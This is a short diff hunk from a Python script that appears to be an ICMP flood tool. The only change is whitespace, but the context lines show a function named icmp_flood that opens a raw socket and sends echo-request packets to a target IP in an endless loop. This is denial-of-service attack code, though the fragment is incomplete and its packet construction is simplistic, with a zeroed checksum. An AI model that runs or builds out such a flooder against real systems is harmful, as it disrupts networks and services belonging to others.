@@ -8,7 +8,7 @@ def icmp_flood(target_ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
     
     packet_id = random.randint(0, 65535)
-    
+     
     while True:
         packet = struct.pack("BBHHH", 8, 0, 0, packet_id, 1)
         s.sendto(packet, (target_ip, 0))
